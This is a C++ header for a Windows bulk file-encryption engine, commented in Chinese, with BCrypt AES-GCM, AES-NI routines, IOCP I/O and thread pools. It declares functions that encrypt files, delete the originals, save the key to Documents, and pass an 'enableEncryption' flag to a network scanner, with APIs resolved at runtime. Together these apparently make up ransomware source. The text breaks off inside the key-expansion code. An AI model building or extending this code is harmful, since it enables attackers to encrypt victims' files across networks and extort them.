// EncryptionUtils.h - 终极优化版（异步IOCP + 内存池 + 硬件加速）
#pragma once
#ifndef TEX_H
#define TEX_H
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

// 在文件开头添加编译器特定的优化指令
// 在文件开头添加这些编译器特定的优化指令
#ifdef _MSC_VER
#pragma optimize("gt", on)      // 代码跟踪优化
#pragma optimize("s", on)      // 优化代码大小
#pragma optimize("y", on)      // 帧指针省略
#pragma inline_depth(255)       // 最大内联深度
#pragma auto_inline(on)        // 自动内联
#pragma intrinsic(memcpy, memset, memcmp) // 内建函数
#pragma check_stack(off)       // 关闭栈检查
#pragma runtime_checks("", off) // 关闭运行时检查
#endif

#ifdef __GNUC__
#pragma GCC optimize("O3")     // 最高优化级别
#pragma GCC optimize("unroll-loops") // 循环展开
#pragma GCC optimize("inline-functions") // 内联函数
#pragma GCC optimize("tree-vectorize") // 树向量化
#pragma GCC optimize("peel-loops")     // 循环剥离
#pragma GCC optimize("no-stack-protector") // 关闭栈保护
#endif
// 修复：添加缺失的STATUS_SUCCESS定义
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#ifndef BCRYPT_INIT_AUTH_MODE_INFO
#define BCRYPT_INIT_AUTH_MODE_INFO(_AuthInfo_) \
    do { \
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_STACK(_AuthInfo_); \
        (_AuthInfo_).dwInfoVersion = 1; \
        (_AuthInfo_).dwInfoVersionSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO); \
    } while (0)
#endif

#ifndef ERROR_RESOURCE_DEADLOCK
#define ERROR_RESOURCE_DEADLOCK 0x4F
#endif

#ifdef __AES__
#include <wmmintrin.h>
__m128i aesni_encrypt(__m128i data, __m128i key) {
    return _mm_aesenc_si128(data, key);
}
#endif

#include <Windows.h>
#include <algorithm>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h>
#include <map>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include <future>
#include <optional>
#include <chrono>
#include <deque>
#include <numeric>
#include <algorithm>
#include <atomic>
#include <memory>
#include "Message.h"
#include "getapi.h"
#include "rsa.h"
#include "networkscan.h"

// crypt1.h - add forward declarations instead of including networkscan.h
namespace encryption_pipeline { class PipelineController; }
// 在文件末尾的辅助函数区域添加这个函数
// ==================== 新增的文件大小获取函数 ====================
inline uintmax_t GetFileSizeOptimized(const fs::path& filePath) {
    try {
        if (!fs::exists(filePath)) {
            std::cerr << "File does not exist: " << filePath << std::endl;
            return 0;
        }

        return fs::file_size(filePath);
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error getting file size: " << e.what()
            << " for file: " << filePath << std::endl;
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Error getting file size: " << e.what()
            << " for file: " << filePath << std::endl;
        return 0;
    }
}
namespace network_scanner {
    // 声明必须与 networkscan.h 中的签名严格一致：
    void SetPipelineController(std::shared_ptr<encryption_pipeline::PipelineController> controller);
    VOID StartScan(std::shared_ptr<encryption_pipeline::PipelineController> pipelineController, bool enableEncryption);

}

inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096;
inline constexpr size_t CHUNK_ENCRYPT_RATIO = 1;
inline constexpr size_t LARGE_FILE_THRESHOLD = 64 * 1024 * 1024;
inline constexpr size_t SMALL_FILE_THRESHOLD = 1024 * 1024;
inline constexpr DWORD MAX_WORKER_THREADS = 64;
// ==================== 配置系统 ====================
class RuntimeConfigManager {
private:
    static RuntimeConfigManager* instance;
    mutable std::mutex configMutex;
    std::atomic<bool> configLoaded{ false };

    // 配置参数
    std::atomic<DWORD> maxWorkerThreads{ 64 };
    std::atomic<DWORD> ioThreads{ 4 };
    std::atomic<DWORD> computeThreads{ 16 };
    std::atomic<DWORD> managerThreads{ 1 };
    std::atomic<size_t> memoryPoolSize{ 1024 * 1024 * 64 };
    std::atomic<size_t> asyncBufferSize{ 1024 * 1024 };
    std::atomic<bool> enableGPUAcceleration{ false };
    std::atomic<bool> enableAESNI{ true };
    std::atomic<bool> enableMemoryPool{ true };
    std::atomic<bool> enableNUMAOptimization{ true };
    std::atomic<DWORD> batchSize{ 8 };
    std::atomic<size_t> maxConcurrentIO{ 80 };
    std::atomic<DWORD> iocpConcurrency{ 4 };

    RuntimeConfigManager() = default;

public:
    static RuntimeConfigManager& getInstance() {
        static RuntimeConfigManager instance;
        return instance;
    }

    void loadConfig() {
        std::lock_guard<std::mutex> lock(configMutex);
        if (configLoaded) return;

        // 更激进的默认配置
        maxWorkerThreads = std::min(MAX_WORKER_THREADS,
            static_cast<DWORD>(std::thread::hardware_concurrency() * 4));  // 从2倍增加到4倍

        ioThreads = 8;  // 增加I/O线程
        computeThreads = 32;  // 增加计算线程
        memoryPoolSize = 1024 * 1024 * 128;  // 增加内存池大小
        asyncBufferSize = 1024 * 1024 * 4;  // 增加异步缓冲区
        batchSize = 16;  // 增加批处理大小

        configLoaded = true;
        std::cout << "Optimized runtime configuration loaded" << std::endl;
    }

    // 配置获取接口
    DWORD getMaxWorkerThreads() const { return maxWorkerThreads; }
    DWORD getIOThreads() const { return ioThreads; }
    DWORD getComputeThreads() const { return computeThreads; }
    bool getEnableGPUAcceleration() const { return enableGPUAcceleration; }
    bool getEnableAESNI() const { return enableAESNI; }
    size_t getMemoryPoolSize() const { return memoryPoolSize; }

    // 热更新接口
    void updateConfig(const std::string& key, const std::string& value) {
        std::lock_guard<std::mutex> lock(configMutex);
        // 简化实现，实际应该解析key-value
        std::cout << "Config updated: " << key << " = " << value << std::endl;
    }
};
bool safeRenameFile(const fs::path& from, const fs::path& to) {
    std::error_code ec;
    const int maxRetries = 3;

    for (int attempt = 0; attempt < maxRetries; ++attempt) {
        try {
            // 确保目标目录存在
            fs::create_directories(to.parent_path(), ec);

            // 如果目标文件已存在，先删除
            if (fs::exists(to)) {
                fs::remove(to, ec);
                if (ec) {
                    std::cerr << "Failed to remove existing file: " << to << std::endl;
                    continue;
                }
            }

            // 尝试重命名
            fs::rename(from, to, ec);
            if (!ec) {
                std::cout << "File successfully committed: " << to << std::endl;
                return true;
            }

            // 如果重命名失败，尝试复制方式
            if (attempt == maxRetries - 1) {
                std::cout << "Using copy fallback for: " << to << std::endl;
                fs::copy_file(from, to, fs::copy_options::overwrite_existing, ec);

                if (!ec) {
                    fs::remove(from, ec);
                    std::cout << "File successfully committed via copy: " << to << std::endl;
                    return true;
                }
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100 * (attempt + 1)));
        }
        catch (const std::exception& e) {
            std::cerr << "Exception during file commit (attempt " << (attempt + 1) << "): "
                << e.what() << std::endl;
        }
    }

    return false;
}
// ==================== 内存池系统 ====================
class AlignedMemoryPool {
private:
    struct MemoryBlock {
        void* ptr;
        size_t size;
        bool inUse;
        std::chrono::steady_clock::time_point allocationTime;
    };

    std::vector<MemoryBlock> memoryBlocks;
    mutable std::mutex poolMutex;
    size_t poolSize;
    size_t alignment;
    std::atomic<size_t> allocated{ 0 };
    std::atomic<size_t> peakAllocated{ 0 };

public:
    AlignedMemoryPool(size_t initialSize, size_t align = 64)
        : poolSize(initialSize), alignment(align) {
        preallocateMemory();
    }

    ~AlignedMemoryPool() {
        std::lock_guard<std::mutex> lock(poolMutex);
        for (auto& block : memoryBlocks) {
            if (block.ptr) {
                _aligned_free(block.ptr);
            }
        }
    }

    // 修复后的AlignedMemoryPool类allocate方法
    void* allocate(size_t size) {
        std::lock_guard<std::mutex> lock(poolMutex);

        // 优化：小对象快速路径
        if (size <= 1024) {
            // 使用更高效的查找策略：最近使用优先
            for (auto it = memoryBlocks.rbegin(); it != memoryBlocks.rend(); ++it) {
                if (!it->inUse && it->size >= size) {
                    it->inUse = true;
                    it->allocationTime = std::chrono::steady_clock::now();
                    allocated.fetch_add(size, std::memory_order_relaxed);

                    // 更新峰值使用量
                    size_t currentAllocated = allocated.load(std::memory_order_relaxed);
                    size_t currentPeak = peakAllocated.load(std::memory_order_relaxed);
                    if (currentAllocated > currentPeak) {
                        peakAllocated.store(currentAllocated, std::memory_order_relaxed);
                    }

                    return it->ptr;
                }
            }
        }

        // 大对象或未找到合适块，分配新内存
        void* newPtr = _aligned_malloc(size, alignment);
        if (newPtr) {
            memoryBlocks.push_back({ newPtr, size, true, std::chrono::steady_clock::now() });
            allocated.fetch_add(size, std::memory_order_relaxed);

            // 更新峰值使用量
            size_t currentAllocated = allocated.load(std::memory_order_relaxed);
            size_t currentPeak = peakAllocated.load(std::memory_order_relaxed);
            if (currentAllocated > currentPeak) {
                peakAllocated.store(currentAllocated, std::memory_order_relaxed);
            }
        }

        return newPtr;
    }
    void deallocate(void* ptr) {
        std::lock_guard<std::mutex> lock(poolMutex);

        for (auto& block : memoryBlocks) {
            if (block.ptr == ptr) {
                block.inUse = false;
                allocated.fetch_sub(block.size);
                return;
            }
        }

        // 不在池中的内存直接释放
        _aligned_free(ptr);
    }

    size_t getAllocatedSize() const { return allocated; }
    size_t getPeakAllocated() const { return peakAllocated; }

private:
    void preallocateMemory() {
        std::lock_guard<std::mutex> lock(poolMutex);
        // 预分配一些常用大小的内存块
        const size_t sizes[] = { 64, 256, 1024, 4096, 16384, 65536, 262144, 1048576 };
        for (size_t size : sizes) {
            for (int i = 0; i < 10; ++i) {
                void* ptr = _aligned_malloc(size, alignment);
                if (ptr) {
                    memoryBlocks.push_back({ ptr, size, false,
                        std::chrono::steady_clock::now() });
                }
            }
        }
    }
};

// ==================== IOCP异步I/O系统 ====================
class IOCPAsyncIO {
private:
    HANDLE iocpHandle;
    std::atomic<bool> running{ false };
    std::vector<std::thread> workerThreads;
    std::function<void(DWORD, DWORD, LPOVERLAPPED)> completionHandler;

public:
    IOCPAsyncIO() : iocpHandle(NULL) {}

    ~IOCPAsyncIO() {
        stop();
    }

    bool initialize(DWORD concurrency = 0) {
        iocpHandle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, concurrency);
        if (!iocpHandle) {
            std::cerr << "Failed to create IOCP: " << GetLastError() << std::endl;
            return false;
        }

        running = true;
        DWORD threadCount = concurrency > 0 ? concurrency : std::thread::hardware_concurrency();

        for (DWORD i = 0; i < threadCount; ++i) {
            workerThreads.emplace_back([this]() { iocpWorker(); });
        }

        std::cout << "IOCP initialized with " << threadCount << " threads" << std::endl;
        return true;
    }

    void stop() {
        running = false;

        if (iocpHandle) {
            for (size_t i = 0; i < workerThreads.size(); ++i) {
                PostQueuedCompletionStatus(iocpHandle, 0, 0, NULL);
            }

            for (auto& thread : workerThreads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
            workerThreads.clear();

            CloseHandle(iocpHandle);
            iocpHandle = NULL;
        }
    }

    bool associateDevice(HANDLE fileHandle, ULONG_PTR completionKey) {
        HANDLE result = CreateIoCompletionPort(fileHandle, iocpHandle, completionKey, 0);
        return result != NULL;
    }

    void setCompletionHandler(std::function<void(DWORD, DWORD, LPOVERLAPPED)> handler) {
        completionHandler = handler;
    }

    bool postCompletion(DWORD bytesTransferred, ULONG_PTR completionKey, LPOVERLAPPED overlapped) {
        return PostQueuedCompletionStatus(iocpHandle, bytesTransferred, completionKey, overlapped);
    }

private:
    void iocpWorker() {
        while (running) {
            DWORD bytesTransferred = 0;
            ULONG_PTR completionKey = 0;
            LPOVERLAPPED overlapped = NULL;

            BOOL success = GetQueuedCompletionStatus(iocpHandle, &bytesTransferred,
                &completionKey, &overlapped, INFINITE);

            if (!running) break;

            DWORD error = success ? ERROR_SUCCESS : GetLastError();

            if (completionHandler) {
                completionHandler(bytesTransferred, error, overlapped);
            }
        }
    }
};

// ==================== 线程亲和性管理 ====================
class ThreadAffinityManager {
private:
    struct ProcessorGroupInfo {
        KAFFINITY affinityMask;
        DWORD processorCount;
        std::vector<DWORD> logicalProcessors;
    };

    std::vector<ProcessorGroupInfo> processorGroups;
    std::atomic<DWORD> nextProcessor{ 0 };
    mutable std::mutex affinityMutex;

public:
    bool initialize() {
        DWORD groupCount = GetActiveProcessorGroupCount();
        if (groupCount == 0) {
            std::cerr << "Failed to get processor group count" << std::endl;
            return false;
        }

        for (WORD group = 0; group < groupCount; ++group) {
            DWORD processorCount = GetActiveProcessorCount(group);
            if (processorCount == 0) continue;

            KAFFINITY affinityMask = 0;
            std::vector<DWORD> logicalProcessors;

            for (DWORD processor = 0; processor < processorCount; ++processor) {
                PROCESSOR_NUMBER procNumber;
                procNumber.Group = group;
                procNumber.Number = processor;
                procNumber.Reserved = 0;

                logicalProcessors.push_back(processor);
                affinityMask |= (KAFFINITY(1) << processor);
            }

            processorGroups.push_back({ affinityMask, processorCount, logicalProcessors });
        }

        std::cout << "Thread affinity manager initialized with "
            << processorGroups.size() << " processor groups" << std::endl;
        return true;
    }

    bool setThreadAffinity(HANDLE threadHandle, DWORD preferredGroup = MAXDWORD) {
        std::lock_guard<std::mutex> lock(affinityMutex);

        if (processorGroups.empty()) {
            return false;
        }

        DWORD groupIndex = preferredGroup;
        if (groupIndex == MAXDWORD || groupIndex >= processorGroups.size()) {
            groupIndex = nextProcessor.load() % processorGroups.size();
            nextProcessor.fetch_add(1);
        }

        const auto& group = processorGroups[groupIndex];
        GROUP_AFFINITY groupAffinity;
        groupAffinity.Group = static_cast<WORD>(groupIndex);
        groupAffinity.Mask = group.affinityMask;
        groupAffinity.Reserved[0] = groupAffinity.Reserved[1] = groupAffinity.Reserved[2] = 0;

        return SetThreadGroupAffinity(threadHandle, &groupAffinity, NULL) != FALSE;
    }

    // 在ThreadAffinityManager类中优化setCurrentThreadAffinity方法
    bool setCurrentThreadAffinity(DWORD preferredGroup = MAXDWORD) {
        std::lock_guard<std::mutex> lock(affinityMutex);

        if (processorGroups.empty()) {
            return false;
        }

        DWORD groupIndex = preferredGroup;
        if (groupIndex == MAXDWORD || groupIndex >= processorGroups.size()) {
            // 使用轮询策略但避免false sharing
            groupIndex = (nextProcessor.fetch_add(1, std::memory_order_relaxed)) % processorGroups.size();
        }

        const auto& group = processorGroups[groupIndex];

        // 使用更精确的亲和性设置
        DWORD_PTR processAffinity, systemAffinity;
        if (GetProcessAffinityMask(GetCurrentProcess(), &processAffinity, &systemAffinity)) {
            // 只在可用的处理器上设置亲和性
            KAFFINITY availableMask = group.affinityMask & static_cast<KAFFINITY>(processAffinity);
            if (availableMask != 0) {
                GROUP_AFFINITY groupAffinity;
                groupAffinity.Group = static_cast<WORD>(groupIndex);
                groupAffinity.Mask = availableMask;
                groupAffinity.Reserved[0] = groupAffinity.Reserved[1] = groupAffinity.Reserved[2] = 0;

                return SetThreadGroupAffinity(GetCurrentThread(), &groupAffinity, NULL) != FALSE;
            }
        }

        return false;
    }

    DWORD getProcessorGroupCount() const {
        return static_cast<DWORD>(processorGroups.size());
    }
};

// ==================== 性能监控系统 ====================
class PerformanceStatsManager {

private:
    struct StageMetrics {
        std::atomic<size_t> totalOperations{ 0 };
        std::atomic<size_t> totalBytes{ 0 };
        std::atomic<double> totalTimeMs{ 0.0 };
        std::atomic<double> peakThroughputMBs{ 0.0 };
        std::atomic<size_t> errorCount{ 0 };

        void update(size_t bytes, double timeMs) {
            totalOperations.fetch_add(1);
            totalBytes.fetch_add(bytes);
            totalTimeMs.fetch_add(timeMs);

            double throughput = (bytes / (1024.0 * 1024.0)) / (timeMs / 1000.0);
            double currentPeak = peakThroughputMBs.load();
            while (throughput > currentPeak &&
                !peakThroughputMBs.compare_exchange_weak(currentPeak, throughput)) {
                // 循环直到成功更新峰值
            }
        }
    };

    std::map<std::string, StageMetrics> stageMetrics;
    mutable std::mutex metricsMutex;
    std::atomic<bool> monitoring{ false };
    std::thread monitoringThread;

public:
    void startMonitoring() {
        monitoring = true;
        monitoringThread = std::thread([this]() { monitoringWorker(); });
    }

    void stopMonitoring() {
        monitoring = false;
        if (monitoringThread.joinable()) {
            monitoringThread.join();
        }
    }

    void recordMetric(const std::string& stageName, size_t bytes, double timeMs) {
        std::lock_guard<std::mutex> lock(metricsMutex);
        stageMetrics[stageName].update(bytes, timeMs);
    }

    void recordError(const std::string& stageName) {
        std::lock_guard<std::mutex> lock(metricsMutex);
        stageMetrics[stageName].errorCount.fetch_add(1);
    }

    void printStats() const {
        std::lock_guard<std::mutex> lock(metricsMutex);
        std::cout << "\n=== Performance Statistics ===" << std::endl;

        for (const auto& [stage, metrics] : stageMetrics) {
            double avgTime = metrics.totalOperations > 0 ?
                metrics.totalTimeMs / metrics.totalOperations : 0.0;
            double avgThroughput = metrics.totalTimeMs > 0 ?
                (metrics.totalBytes / (1024.0 * 1024.0)) / (metrics.totalTimeMs / 1000.0) : 0.0;

            std::cout << stage << ":\n"
                << "  Operations: " << metrics.totalOperations << "\n"
                << "  Total Bytes: " << metrics.totalBytes << "\n"
                << "  Avg Time: " << avgTime << " ms\n"
                << "  Peak Throughput: " << metrics.peakThroughputMBs << " MB/s\n"
                << "  Errors: " << metrics.errorCount << std::endl;
        }
    }

private:
    void monitoringWorker() {
        // 空实现 - 移除自动打印功能
        while (monitoring) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            // 不自动打印统计信息，避免干扰正常输出
        }
    }
};

// ==================== GPU加速接口（预留） ====================
class GPUAccelerationManager {
private:
    std::atomic<bool> gpuAvailable{ false };
    std::atomic<bool> initialized{ false };

public:
    bool initialize() {
        // 检测GPU可用性
        // 这里简化实现，实际应该检测OpenCL/DirectCompute支持
        gpuAvailable = false; // 暂时禁用GPU加速
        initialized = true;

        std::cout << "GPU acceleration: " << (gpuAvailable ? "AVAILABLE" : "UNAVAILABLE") << std::endl;
        return gpuAvailable;
    }

    bool isAvailable() const { return gpuAvailable && initialized; }

    std::vector<BYTE> encryptWithGPU(const std::vector<BYTE>& data, const BYTE* key) {
        if (!gpuAvailable) {
            throw std::runtime_error("GPU acceleration not available");
        }

        // GPU加密实现（预留）
        // 这里返回空向量表示功能未实现
        return std::vector<BYTE>();
    }

    void cleanup() {
        initialized = false;
    }
};

// ==================== 优化后的常量定义 ====================
inline constexpr DWORD KEY_LENGTH = 16;
inline constexpr DWORD IV_LENGTH = 12;
inline constexpr DWORD TAG_LENGTH = 16;
inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64;
inline constexpr DWORD MAX_CONCURRENT_IO = 80;
//inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15;
inline constexpr size_t CHUNK_SIZE = 1024 * 1024;
//inline constexpr size_t LARGE_FILE_THRESHOLD = 64 * 1024 * 1024;
//inline constexpr size_t SMALL_FILE_THRESHOLD = 1024 * 1024;
inline constexpr DWORD IOCP_CONCURRENCY = 4;
inline constexpr DWORD AESNI_BATCH_SIZE = 8;
inline constexpr DWORD IO_THREADS = 4;
inline constexpr DWORD COMPUTE_THREADS = 16;
inline constexpr DWORD MANAGER_THREADS = 1;
inline constexpr size_t MEMORY_MAPPED_THRESHOLD = 4 * 1024 * 1024;
inline constexpr size_t SMALL_FILE_MANAGER_THREADS = 2;
inline constexpr size_t LARGE_FILE_MANAGER_THREADS = 8;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

// 使用getapi.hpp中的安全API调用宏
#define SAFE_CALL_API(func, ...) \
    (CHECK_API(func) ? func(__VA_ARGS__) : throw std::runtime_error("API not available: " #func))

#define CHECK_API(func) (func != nullptr)

#define ENSURE_API_LOADED(func) \
    do { \
        if (!func) { \
            if (!g_DynamicAPIInitializer.IsInitialized()) { \
                throw std::runtime_error("Dynamic APIs not initialized"); \
            } \
            throw std::runtime_error("API function not loaded: " #func); \
        } \
    } while(0)

// 修复to_hex函数
inline std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << static_cast<unsigned long>(status);
    return ss.str();
}

// 前向声明
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key, bool useMemoryMapping = true);
bool SecureDelete(const fs::path& path);
bool EncryptFileWithMemoryMapping(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
bool EncryptFileWithAsyncIO(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
void GenerateRandomKey(BYTE* key, DWORD length);
bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
fs::path GetUserDocumentsPath();
bool IsAesNiSupported();
bool validateFileHeader(const fs::path& encryptedFile);
bool isFileLocked(const fs::path& filePath);
bool validateEncryptedFile(const fs::path& encryptedFile, const fs::path& originalFile);
bool SecureDeleteFilehf(const fs::path& filePath, int maxRetries = 3);
bool validateEncryptedFileStable(const fs::path& encryptedFile);

// GCM认证加密结构
struct GCM_ENCRYPT_RESULT {
    std::vector<BYTE> ciphertext;
    BYTE tag[TAG_LENGTH];
    bool success;
    NTSTATUS status;
};

// ==================== 优化后的线程局部BCrypt上下文 ====================
// ==================== 优化后的线程局部BCrypt上下文 ====================
// ==================== 优化后的线程局部BCrypt上下文 ====================
struct ThreadLocalBCryptContext {
    BCRYPT_ALG_HANDLE algorithm{ nullptr };
    BCRYPT_KEY_HANDLE key{ nullptr };
    BYTE localIV[IV_LENGTH]{ 0 };
    BYTE localTag[TAG_LENGTH]{ 0 };
    std::atomic<size_t> blocksEncrypted{ 0 };
    std::atomic<double> encryptionTime{ 0.0 };

    // 优化后的AES-NI支持
    bool aesniSupported{ false };
    bool avx2Supported{ false };
    bool avx512Supported{ false };
    alignas(64) BYTE expandedKeys[240]; // 15 * 16 bytes for AES-256 round keys
    int rounds{ 10 };
    std::atomic<uint64_t> totalCycles{ 0 };
    std::atomic<size_t> totalBlocks{ 0 };

    ThreadLocalBCryptContext(const BYTE* keyMaterial) {
        // 检测CPU特性
        aesniSupported = IsAesNiSupported();
        detectAdvancedFeatures();

        if (aesniSupported) {
            // 优化的密钥扩展
            expandKeyOptimized(keyMaterial);
            std::cout << "Optimized AES-NI acceleration enabled (AVX2: " << avx2Supported
                << ", AVX512: " << avx512Supported << ")" << std::endl;
        }

        NTSTATUS status = SAFE_CALL_API(pBCryptOpenAlgorithmProvider,
            &algorithm, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Algorithm init failed");

        const wchar_t gcmMode[] = BCRYPT_CHAIN_MODE_GCM;
        status = SAFE_CALL_API(pBCryptSetProperty, algorithm, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(gcmMode)), sizeof(gcmMode), 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("GCM mode set failed");

        status = SAFE_CALL_API(pBCryptGenerateSymmetricKey, algorithm, &key,
            nullptr, 0, const_cast<BYTE*>(keyMaterial), KEY_LENGTH, 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Key generation failed");

        // 预热优化器
        if (aesniSupported) {
            warmupOptimizer();
        }
    }

    ~ThreadLocalBCryptContext() {
        if (key) SAFE_CALL_API(pBCryptDestroyKey, key);
        if (algorithm) SAFE_CALL_API(pBCryptCloseAlgorithmProvider, algorithm, 0);
    }

    ThreadLocalBCryptContext(const ThreadLocalBCryptContext&) = delete;
    ThreadLocalBCryptContext& operator=(const ThreadLocalBCryptContext&) = delete;

    // 优化后的AES-NI加密方法
   // 在ThreadLocalBCryptContext类中优化encryptWithAESNI方法
    bool encryptWithAESNI(const BYTE* input, BYTE* output, size_t size) {
        if (!aesniSupported || size % 16 != 0) return false;

        auto startCycle = __rdtsc();
        bool success = false;

        try {
            // 使用更激进的大小阈值判断
            if (size >= 8192 && avx512Supported) {
                success = encryptAVX512(input, output, size);
            }
            else if (size >= 2048 && avx2Supported) {
                success = encryptAVX2(input, output, size);
            }
            else if (size >= 512) {
                success = encryptBulkOptimized(input, output, size);
            }
            else {
                // 优化小块处理：使用更大的展开因子
                const size_t blockSize = 16;
                const size_t numBlocks = size / blockSize;

                // 使用4倍循环展开减少分支预测开销
                size_t i = 0;
                for (; i + 3 < numBlocks; i += 4) {
                    __m128i data1 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + i * blockSize));
                    __m128i data2 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + (i + 1) * blockSize));
                    __m128i data3 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + (i + 2) * blockSize));
                    __m128i data4 = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + (i + 3) * blockSize));

                    __m128i enc1 = encryptSingleBlock(data1);
                    __m128i enc2 = encryptSingleBlock(data2);
                    __m128i enc3 = encryptSingleBlock(data3);
                    __m128i enc4 = encryptSingleBlock(data4);

                    _mm_storeu_si128(reinterpret_cast<__m128i*>(output + i * blockSize), enc1);
                    _mm_storeu_si128(reinterpret_cast<__m128i*>(output + (i + 1) * blockSize), enc2);
                    _mm_storeu_si128(reinterpret_cast<__m128i*>(output + (i + 2) * blockSize), enc3);
                    _mm_storeu_si128(reinterpret_cast<__m128i*>(output + (i + 3) * blockSize), enc4);
                }

                // 处理剩余块
                for (; i < numBlocks; ++i) {
                    __m128i data = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + i * blockSize));
                    __m128i encrypted = encryptSingleBlock(data);
                    _mm_storeu_si128(reinterpret_cast<__m128i*>(output + i * blockSize), encrypted);
                }
                success = true;
            }

            if (success) {
                auto endCycle = __rdtsc();
                totalCycles.fetch_add(endCycle - startCycle, std::memory_order_relaxed);
                totalBlocks.fetch_add(size / 16, std::memory_order_relaxed);
                blocksEncrypted.fetch_add(size / 16, std::memory_order_relaxed);
            }
        }
        catch (...) {
            success = false;
        }

        return success;
    }

private:
    // 检测高级CPU特性
    void detectAdvancedFeatures() {
        int cpuInfo[4];

        // 检测AVX2
        __cpuid(cpuInfo, 7);
        avx2Supported = (cpuInfo[1] & (1 << 5)) != 0; // AVX2 bit

        // 检测AVX512
        avx512Supported = (cpuInfo[1] & (1 << 16)) != 0; // AVX512F
    }

    // 优化的密钥扩展
    void expandKeyOptimized(const BYTE* keyMaterial) {
        alignas(16) __m128i* roundKeys = reinterpret_cast<__m128i*>(expandedKeys);

        // AES-128: 只需要加载16字节密钥
        __m128i key = _mm_loadu_si128(reinterpret_cast<const __m128i*>(keyMaterial));
        _mm_store_si128(&roundKeys[0], key);

        // AES-128密钥扩展（10轮，生成11个轮密钥）
        // 第1轮密钥扩展
        __m128i temp1 = _mm_aeskeygenassist_si128(key, 0x01);
        temp1 = _mm_shuffle_epi32(temp1, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp1);
        _mm_store_si128(&roundKeys[1], key);

        // 第2轮密钥扩展
        __m128i temp2 = _mm_aeskeygenassist_si128(key, 0x02);
        temp2 = _mm_shuffle_epi32(temp2, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp2);
        _mm_store_si128(&roundKeys[2], key);

        // 第3轮密钥扩展
        __m128i temp3 = _mm_aeskeygenassist_si128(key, 0x04);
        temp3 = _mm_shuffle_epi32(temp3, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp3);
        _mm_store_si128(&roundKeys[3], key);

        // 第4轮密钥扩展
        __m128i temp4 = _mm_aeskeygenassist_si128(key, 0x08);
        temp4 = _mm_shuffle_epi32(temp4, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp4);
        _mm_store_si128(&roundKeys[4], key);

        // 第5轮密钥扩展
        __m128i temp5 = _mm_aeskeygenassist_si128(key, 0x10);
        temp5 = _mm_shuffle_epi32(temp5, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp5);
        _mm_store_si128(&roundKeys[5], key);

        // 第6轮密钥扩展
        __m128i temp6 = _mm_aeskeygenassist_si128(key, 0x20);
        temp6 = _mm_shuffle_epi32(temp6, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp6);
        _mm_store_si128(&roundKeys[6], key);

        // 第7轮密钥扩展
        __m128i temp7 = _mm_aeskeygenassist_si128(key, 0x40);
        temp7 = _mm_shuffle_epi32(temp7, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp7);
        _mm_store_si128(&roundKeys[7], key);

        // 第8轮密钥扩展
        __m128i temp8 = _mm_aeskeygenassist_si128(key, 0x80);
        temp8 = _mm_shuffle_epi32(temp8, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
